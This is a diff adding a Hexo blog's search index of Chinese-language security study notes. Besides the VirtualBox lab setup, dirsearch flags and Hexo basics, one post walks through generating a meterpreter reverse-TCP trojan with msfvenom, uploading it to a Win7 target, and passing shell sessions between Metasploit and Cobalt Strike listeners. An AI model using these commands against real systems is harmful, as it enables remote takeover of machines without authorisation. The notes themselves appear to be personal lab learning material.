@@ -1,0 +1,213 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>VirtualBox打靶前网络配置</title>
+    <url>/2024/04/25/VirtualBox%E6%89%93%E9%9D%B6%E5%89%8D%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>1、安装好kali和靶机</p>
+<p>2、找到网络控制器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/3.png"
+                      alt="test"
+                ></p>
+<p>3、创建一个新的NAT网络</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/4.jpg"
+                      alt="Test"
+                ></p>
+<p>4、kali设置网卡1为NAT，网卡2为Host-only</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/4.png"
+                      alt="test"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/5.png"
+                      alt="test"
+                ></p>
+<p>靶机只设置一个网卡为Host-only就可以了。</p>
+<p>kali里面检测：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/6.png"
+                      alt="tesk"
+                ></p>
+<p>eth0:net，eth1:host-only</p>
+<p>扫描时指定为网卡1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/7.png"
+                      alt="test"
+                ></p>
+<p>这样便可以找到靶机ip。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>dirsearch命令使用</title>
+    <url>/2024/03/11/dirsearch%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<blockquote>
+<p>python dirsearch.py -u &#x2F;&#x2F; -u是url的缩写。 指定目标网站</p>
+<p>python dirsearch.py -u example.com -e* &#x2F;&#x2F;-e 代表指定要的文件类型，eg这是一个java的网站就可以-e jsp。*代表就是全部类型扫描。</p>
+<p>python dirsearch.py -u example.com -e* -i 200 &#x2F;&#x2F;-i 代表返回状态码，200就是成功。就是我只要显示返回成功的目录或文件</p>
+<p>python dirsearch.py -u example.com -e* -i 200 -s 1 &#x2F;&#x2F;-s代表延时扫描。因为扫描速度过快容易被封ip 所以需要进行速率限制1代表延迟1秒</p>
+</blockquote>
+<blockquote>
+<p>常用命令:</p>
+<p>–version 显示dirsearch的版本</p>
+<p>-h –help 帮助提示</p>
+<p>-u –url 指定网址</p>
+<p>-e 指定网站语言</p>
+<p>-w 指定字典</p>
+<p>-r 递归目录（跑出目录后，继续跑目录下面的目录）</p>
+<p>-l –url-list&#x3D;FILE   目标url文件路径</p>
+<p>-i 保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</p>
+<p>-x 排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>CS联动MSF</title>
+    <url>/2024/09/02/CS%E8%81%94%E5%8A%A8MSF/</url>
+    <content><![CDATA[<h1 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h1><p>靶机：win7</p>
+<p>攻击机：kali,win11</p>
+<blockquote>
+<p>CS：监听端口”8080”</p>
+<p>MSF：监听端口”9999”</p>
+</blockquote>
+<h2 id="MSF上线主机给CS"><a href="#MSF上线主机给CS" class="headerlink" title="MSF上线主机给CS"></a>MSF上线主机给CS</h2><p>场景：当MSF有了一个Session会话，利用MSF注入功能，加载CS的Payload</p>
+<p>(1)MSF需要先拿到Shell。这里使用<code>msfvenom</code>生成一个恶意木马，<strong>并上传到靶机</strong></p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=&lt;kali_IP&gt; lport=&lt;kali_Port&gt; -f exe &gt; msf.exe</span></span><br></pre></td></tr></table></figure></div>
+
+<p>eg:<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/8.png"
+                      alt="Text"
+                ></p>
+<p>(2)MSF中开启监听，并在靶机中运行该木马</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole                  #开启msf</span><br><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp </span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost &lt;kali_IP&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport &lt;kali_Port&gt;</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br></pre></td></tr></table></figure></div>
+
+<p>同时靶机运行(1)产生的木马，成功进入meterpreter</p>
+<p>(3)在CS中创建监听器</p>
+<blockquote>
+<ul>
+<li><p>监听器类型：<code>windows/beacon_http/reverse_http</code> </p>
+</li>
+<li><p>Host修改为CS的IP，监听指定端口，等待MSF发送</p>
+</li>
+</ul>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/9.png"
+                      alt="Text"
+                ></p>
+<p>(4)在MSF中，将session挂到后台</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">挂起会话</span></span><br><span class="line"><span class="meta prompt_">meterpreter&gt; </span><span class="language-bash">background</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用payload_inject模块,执行之后会在本地产生一个新的Handler</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash">use exploit/windows/local/payload_inject</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">根据CS监听器类型选择对应的payload（http或者https）</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置回连地址,CS_IP和监听器端口</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> LHOST &lt;CS_IP&gt;</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> LPORT &lt;CS_Port&gt;   <span class="comment"># 前面CS监听器端口</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定要执行的Session</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> session &lt;Session_ID&gt;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置MSF不启动监听,不然MSF会提示执行成功,但没有会话建立</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> disablepayloadhandler <span class="literal">true</span></span> </span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure></div>
+
+<p>(5)运行后cs上线靶机</p>
+<h2 id="CS上线主机给MSF"><a href="#CS上线主机给MSF" class="headerlink" title="CS上线主机给MSF"></a>CS上线主机给MSF</h2><p>场景：CS已上线主机，想把这个主机发送给MSF，生成一个MSF的Session。</p>
+<p>(1)</p>
+<ul>
+<li><p>CS生成木马并上传到靶机，运行后主机上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/10.png"
+                      alt="Text"
+                ></p>
+</li>
+<li><p>打开MSF，开始监听</p>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置监听器</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash">use exploit/multi/handler</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择Payload</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_http <span class="comment"># 不要用64位</span></span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> lhost &lt;kali_IP&gt;</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash"><span class="built_in">set</span> lport &lt;kali_Port&gt;   <span class="comment"># 设置任意端口进行监听</span></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动监听器</span></span><br><span class="line"><span class="meta prompt_">msf&gt; </span><span class="language-bash">run</span></span><br></pre></td></tr></table></figure></div>
+
+<p>(2)然后在CS上设置一个Foreign监听器MSF</p>
+<blockquote>
+<ul>
+<li><p>IP设置为MSF的外网IP </p>
+</li>
+<li><p>端口设置为上面设置MSF监听端口</p>
+</li>
+</ul>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/11.png"
+                      alt="Test"
+                ></p>
+<p>(3)在CS中右键会话，点击<code>Spawn</code>，选择MSF的监听器，或者在CS上线主机运行：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; Spawn msf</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/12.png"
+                      alt="Text"
+                ></p>
+<p>（4）发送后MSF获得Session</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/02/15/hello-world/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/a.jpg"
+                      alt="Test"
+                ><br>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><p>关于hexo的文件结构</p>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">├── _config.yml      // 站点配置文件</span><br><span class="line">├── db.json          // 缓存文件</span><br><span class="line">├── node_modules     // 安装的插件以及hexo所需的一些nodejs模块</span><br><span class="line">├── package.json     // 项目的依赖文件</span><br><span class="line">├── scaffolds        // 模版文件</span><br><span class="line">├── source           // 源文件，用来存放你的文章 md 文件</span><br><span class="line">└── themes           // 主题文件</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure></div>
+
+<p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p>
+<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">即hexo g</span><br></pre></td></tr></table></figure></div>
+
+<p>生成静态文件</p>
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br><span class="line">hexo s</span><br><span class="line">加载到本地服务器，预览</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br><span class="line">部署文件到github，更新网页端内容</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>刷新个人博客，我一般使用如下命令来刷新博客。</p>
+<blockquote>
+<p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</p>
+</blockquote>
+]]></content>
+  </entry>
+  <entry>
+    <title>本地局域网文件传输</title>
+    <url>/2024/03/14/%E6%9C%AC%E5%9C%B0%E5%B1%80%E5%9F%9F%E7%BD%91%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/</url>
+    <content><![CDATA[<p>前提条件，拥有python环境</p>
+<p>在命令行直接输入<code>python -m http.server 8888</code></p>
+<p>完成</p>
+<p>注意：<font color=red>当前所在文件路径，就是之后访问的路径。888是定义端口名称，可以随便改成未被占用的端口。</font></p>
+<p>使用：</p>
+<p>用ip进行访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/2.jpg"
+                      alt="Test"
+                ></p>
+]]></content>
+  </entry>
+</search>
